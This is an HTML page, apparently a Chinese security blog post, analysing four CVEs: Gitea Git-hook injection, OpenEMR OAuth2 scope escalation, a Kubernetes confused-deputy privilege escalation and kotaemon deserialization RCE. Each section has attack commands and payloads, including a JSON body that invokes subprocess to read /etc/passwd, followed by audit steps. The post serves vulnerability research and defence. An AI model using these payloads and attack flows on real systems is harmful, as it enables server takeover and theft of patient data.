@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>隐式信任四重崩塌：Git钩子注入、OAuth2 Scope越权、K8s Confused Deputy、Python反序列化 — DARKSEC</title>
+<meta name="description" content="Gitea Git hook注入RCE(CVSS 9.8)、OpenEMR OAuth2动态客户端注册FHIR scope提升、Kubernetes ClusterCurator命名空间→集群admin提权、kotaemon __type__反序列化RCE——四枚CVE揭示隐式信任的系统性崩塌。">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 漏洞研究 / 隐式信任</div>
+        <h1>隐式信任四重崩塌：Git钩子注入、OAuth2 Scope越权、K8s Confused Deputy、Python反序列化 🐱💥</h1>
+        <div class="article-meta">
+          <span>📅 2026-08-05</span>
+          <span>⏱ 20 min read</span>
+          <span>🏷 Git安全 / OAuth2 / Kubernetes / 反序列化 / CVE</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#intro">引言：隐式信任的四副面孔</a></li>
+            <li><a href="#git-hook">CVE-2026-60004：Git Add/Add碰撞→钩子注入RCE</a></li>
+            <li><a href="#oauth2-scope">CVE-2026-67610：OAuth2动态客户端注册FHIR Scope越权</a></li>
+            <li><a href="#k8s-confused">CVE-2026-10059/10090：Kubernetes Confused Deputy提权</a></li>
+            <li><a href="#python-deser">CVE-2026-69098：Python __type__不可信反序列化RCE</a></li>
+            <li><a href="#patterns">攻击模式提炼：信任边界的四次崩溃</a></li>
+          </ul>
+        </div>
+
+        <h2 id="intro">引言：隐式信任的四副面孔 ⚡</h2>
+        <p>今天的四枚漏洞横跨<strong>Git托管平台</strong>、<strong>医疗FHIR系统</strong>、<strong>Kubernetes多租户集群</strong>和<strong>AI应用框架</strong>四个完全不同的领域，但它们共享同一个根因：<strong>系统对某个关键环节的隐式信任被攻击者利用</strong> nya~ 🐾</p>
+
+        <blockquote>
+          <p>🔥 <strong>核心洞察</strong>：Gitea信任「同一patch发两次是幂等的无害操作」；OpenEMR信任「管理员会逐个审核scope」；Kubernetes信任「CRD控制器不会越权操作集群资源」；kotaemo信任「JSON中的类型字段指向的是安全的类」。四层信任，四层崩塌。</p>
+        </blockquote>
+
+        <h2 id="git-hook">CVE-2026-60004：Git Add/Add碰撞→钩子注入RCE 🔓</h2>
+
+        <h3>漏洞概述</h3>
+        <p>Gitea的diffpatch API是一个典型的「接受用户patch→服务端apply」管线。它在<strong>bare临时clone</strong>中执行<code>git apply --index --cached --binary -3</code>，设计意图是patch只写入暂存区不落地磁盘。但攻击者<strong>同一patch发送两次</strong>→第二次触发Add/Add冲突→Git三路合并回退机制将冲突文件<strong>写入磁盘</strong>→路径可控命中<code>hooks/</code>→RCE。CVSS 9.8 🚨</p>
+
+        <h3>攻击链深度分析</h3>
+        <pre><code># 核心攻击流程
+# 1. 创建恶意patch，文件路径指向hooks/post-index-change
+#    内容为恶意shell脚本
+
+# 2. 第一次POST到Gitea diffpatch API
+curl -X POST https://gitea.example.com/api/v1/diffpatch \
+  -H "Content-Type: application/json" \
+  -d '{"diff_content": "..."}'
+# → git apply --cached 成功，文件只在暂存区
+
+# 3. 第二次POST完全相同的patch
+# → Git检测到Add/Add冲突（同文件已存在）
+# → 三路合并(-3)回退：将冲突文件写入磁盘
+# → hooks/post-index-change 落地到 .git/hooks/
+
+# 4. Git索引更新触发hook执行
+# → 攻击者命令以Gitea服务账户运行 → RCE</code></pre>
+
+        <h3>关键洞察 🧠</h3>
+        <p>这个漏洞的核心有三个精妙之处：</p>
+        <ul>
+          <li><strong>bare clone的根目录即.git目录</strong>——正常仓库需要写<code>.git/hooks/</code>（路径隔离），bare clone下直接写<code>hooks/</code>就命中了hook目录</li>
+          <li><strong>Git的<code>--cached</code>标志被Add/Add冲突绕过</strong>——设计意图是「不写入工作树」，但三路合并冲突解决的fallback需要写临时文件，而<strong>文件路径来自patch本身</strong></li>
+          <li><strong>同一patch发两次不是bug而是exploit策略</strong>——开发者预期幂等操作（重复调用结果相同），但Git的冲突状态使第二次执行产生完全不同的副作用</li>
+        </ul>
+
+        <pre><code># 审计方法：测试所有接受patch的Git平台端点
+# Step 1: 找到patch/diff API
+GET /api/v1/repos/{owner}/{repo}/diffpatch
+
+# Step 2: 构造patch，文件路径为hooks/post-index-change
+# Step 3: 提交两次，检查第二次是否触发Add/Add冲突
+# Step 4: 验证hook文件是否落地到.git/hooks/
+
+# 迁移目标
+# - GitHub Pulls API patch apply → 是否有类似模式
+# - GitLab merge request diff apply → bare clone?
+# - CI/CD的git apply pipeline → -3标志?
+# - 所有「接受外部patch → apply → 写入仓库」的服务</code></pre>
+
+        <h2 id="oauth2-scope">CVE-2026-67610：OAuth2动态客户端注册FHIR Scope越权 🔐</h2>
+
+        <h3>漏洞概述</h3>
+        <p>OpenEMR的OAuth2动态客户端注册端点（RFC 7591）接受未认证POST→攻击者自签名JWKS+声明全部42个FHIR scope→管理员审批时<strong>未逐个scope审核</strong>→<code>client_credentials</code> grant获取access_token→读取所有患者FHIR数据。CVSS 8.1</p>
+
+        <h3>攻击流程</h3>
+        <pre><code># 1. 生成自签名密钥对
+openssl genrsa -out private.pem 2048
+openssl rsa -in private.pem -pubout -out public.pem
+
+# 2. 构造JWKS（将公钥转为JWK格式）
+# 然后向注册端点POST，声明所有scope
+curl -X POST https://emr.example.com/oauth2/default/registration \
+  -H "Content-Type: application/json" \
+  -d '{
+    "client_name": "Patient Access App",
+    "jwks": {"keys": [{...public_key_as_jwk...}]},
+    "scope": "openid fhirUser system/*.read system/*.write patient/*.read patient/*.write offline_access"
+  }'
+
+# 3. 管理员审批（通常只看客户端名称，不审核scope）
+# 4. 使用client_credentials + 自签名JWT assertion获取token
+curl -X POST https://emr.example.com/oauth2/default/token \
+  -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
+  -d "scope=system/Patient.read system/Observation.read" \
+  -d "client_assertion={signed_jwt}"</code></pre>
+
+        <h3>为什么这是设计缺陷而非配置错误 🧠</h3>
+        <blockquote>
+          <p>💡 OAuth2动态注册规范的核心假设是<strong>scope由客户端声明而非服务端分配</strong>——这等于让访客自己填写「我需要哪些门禁卡权限」，然后交给保安审批。保安（管理员）通常只关心「这个人我认不认识」，不会逐一检查每张门禁卡的权限范围。这与手机App权限弹窗的「全部允许」问题本质相同。</p>
+        </blockquote>
+
+        <pre><code># 审计方法
+# 1. 检查是否存在/.well-known/openid-configuration
+#    → registration_endpoint字段
+# 2. POST自签名JWKS + 全部可用scope
+# 3. 检查注册后状态是否为「待审批」
+# 4. 检查审批界面是否展示scope详情
+# 5. 审批通过后尝试client_credentials grant
+
+# 迁移目标
+# - Keycloak动态客户端注册
+# - Auth0 Management API
+# - Okta Dynamic Client Registration
+# - SMART on FHIR 医疗系统
+# - WSO2 API Manager开发者门户</code></pre>
+
+        <h2 id="k8s-confused">CVE-2026-10059/10090：Kubernetes Confused Deputy提权 🚀</h2>
+
+        <h3>漏洞概述</h3>
+        <p>Kubernetes多租户环境中，<strong>控制器的信任边界是集群级的</strong>。命名空间admin创建ClusterCurator CR→控制器以自身集群级ServiceAccount调和→在调和过程中mint了一个<strong>集群admin权限的token</strong>→命名空间admin完全控制集群。CVSS 9.1 + 9.9（ACM的Subscription控制器可进一步实现集群级RCE）</p>
+
+        <h3>Confused Deputy的本质</h3>
+        <pre><code># RBAC只控制「谁可以创建CR」，不控制「CR被调和后控制器做什么」
+
+# 命名空间admin的权限
+kubectl auth can-i create clustercurators -n my-namespace
+# → Yes (命名空间级CRD允许)
+
+# 控制器的ServiceAccount权限
+kubectl get clusterrolebinding -o json | jq '.subjects[] | select(.name=="clustercurator-controller")'
+# → cluster-admin (集群级权限)
+
+# 攻击流程
+# 1. namespace admin创建恶意ClusterCurator CR
+kubectl apply -f - <<EOF
+apiVersion: cluster.open-cluster-management.io/v1beta1
+kind: ClusterCurator
+metadata:
+  name: evil-curator
+  namespace: my-namespace
+spec:
+  desiredCuration: install
+  cluster: local-cluster
+EOF
+
+# 2. 控制器调和 → 以cluster-admin身份执行操作
+# 3. 控制器在调和过程中mint新ServiceAccount token
+# 4. namespace admin获取该token → 完全集群控制</code></pre>
+
+        <h3>为什么RBAC无法防御 🧠</h3>
+        <blockquote>
+          <p>💡 这是<strong>声明式API+控制器模式的固有缺陷</strong>。RBAC只控制「谁可以声明意图」（创建CR），不控制「执行者如何实现意图」（控制器的调和逻辑）。任何「事件→处理器→副作用」模式中，如果处理器权限大于事件触发者，就存在Confused Deputy风险。这是微服务架构的普遍问题——ArgoCD、FluxCD、Crossplane、Knative等所有Operator/Controller都可能受影响。</p>
+        </blockquote>
+
+        <pre><code># 审计方法
+# 1. 列举集群中所有CRD
+kubectl get crd -o json | jq '.items[].metadata.name'
+
+# 2. 找到每个CRD的控制器ServiceAccount
+kubectl get deployment -A | grep controller
+kubectl get clusterrolebinding -o json | jq '...'
+
+# 3. 比较：CR创建者权限 vs 控制器权限
+# 如果控制器权限 >> 创建者权限 → Confused Deputy
+
+# 4. 检查控制器调和逻辑中的危险操作
+# - ServiceAccount/TokenRequest创建
+# - ClusterRoleBinding创建
+# - 集群级资源的创建/修改</code></pre>
+
+        <h2 id="python-deser">CVE-2026-69098：Python __type__不可信反序列化RCE 🐍</h2>
+
+        <h3>漏洞概述</h3>
+        <p>kotaemon的<code>/check_connection</code>端点接受JSON→<code>__type__</code>字段指定类名→攻击者提供<code>__type__: subprocess.check_output</code> + <code>args: ["id"]</code>→反序列化时<code>subprocess.check_output(["id"])</code>被调用→RCE。CVSS 9.8</p>
+
+        <h3>攻击原理</h3>
+        <pre><code># 核心payload
+POST /check_connection HTTP/1.1
+Content-Type: application/json
+
+{
+  "__type__": "subprocess.check_output",
+  "args": [["cat", "/etc/passwd"]],
+  "kwargs": {}
+}
+
+# 反序列化逻辑（简化版）
+def deserialize(data):
+    cls = importlib.import_module(data["__type__"])  # 动态导入
+    args = data.get("args", [])
+    kwargs = data.get("kwargs", {})
+    return cls(*args, **kwargs)  # 调用！
+    # → subprocess.check_output(["cat", "/etc/passwd"])
+
+# 关键洞察：gadget chain来源是整个Python环境
+pip list | wc -l  # 每一个已安装包都可能贡献危险类
+# → 100+ packages = 100+ potential gadget classes</code></pre>
+
+        <h3>与传统反序列化的区别 🧠</h3>
+        <blockquote>
+          <p>💡 这不是<code>pickle.loads</code>或<code>yaml.load</code>的问题——而是<strong>「用户输入中的类型字段→动态import/实例化」</strong>的代码路径。检测重点：搜索<code>importlib.import_module</code>、<code>getattr</code>+动态类名、<code>eval</code>+类型名，追踪类名来源是否为用户输入。</p>
+        </blockquote>
+
+        <pre><code># 审计方法
+# 1. 搜索危险的反序列化模式
+grep -rn "importlib.import_module\|getattr.*class\|__type__\|__class__" --include="*.py"
+
+# 2. 检查YAML安全
+grep -rn "yaml.load\b" --include="*.py"  # 应该是safe_load
+grep -rn "add_constructor" --include="*.py"  # 自定义构造器？
+
+# 3. 检查JSON反序列化中的类型字段
+grep -rn "__type__\|__class__\|__module__" --include="*.py"
+
+# 迁移目标
+# - LangChain tool测试功能
+# - Dify tool配置验证
+# - Jupyter kernel配置YAML
+# - Airflow DAG YAML定义
+# - MLflow model serving配置
+# - Ansible playbook YAML</code></pre>
+
+        <h2 id="patterns">攻击模式提炼：信任边界的四次崩溃 🎯</h2>
+
+        <p>四枚CVE虽然攻击对象完全不同，但它们共享一个元模式：</p>
+
+        <pre><code># 隐式信任崩塌的统一框架
+┌─────────────┬─────────────────────┬───────────────────┐
+│ CVE         │ 被信任的环节         │ 信任崩塌方式       │
+├─────────────┼─────────────────────┼───────────────────┤
+│ CVE-60004   │ 幂等操作无副作用     │ Add/Add冲突回退    │
+│ CVE-67610   │ scope由客户端声明    │ 全量scope声明      │
+│ CVE-10059   │ 控制器权限=调和权限  │ 控制器mint admin token │
+│ CVE-69098   │ 类型字段指向安全类   │ subprocess.check_output │
+└─────────────┴─────────────────────┴───────────────────┘</code></pre>
+
+        <p><strong>防御思路</strong>：审计时不要只关注「谁可以访问什么」——要关注<strong>信任链条中每一环节的假设是否可被违反</strong>。幂等性假设、scope声明机制、控制器权限边界、类型字段可信度——这些都是隐式信任，而隐式信任是攻击者最喜欢的攻击面 😼</p>
+
+        <div class="article-tags">
+          <span class="tag pink">Git安全</span>
+          <span class="tag">OAuth2</span>
+          <span class="tag purple">Kubernetes</span>
+          <span class="tag yellow">Python反序列化</span>
+          <span class="tag pink">CVE</span>
+          <span class="tag">隐式信任</span>
+        </div>
+
+        <p style="text-align:center; margin-top:3rem; opacity:0.7; font-style:italic;">~ 感谢阅读 nya~ 🐱✨</p>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> SECURITY LAB</p>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
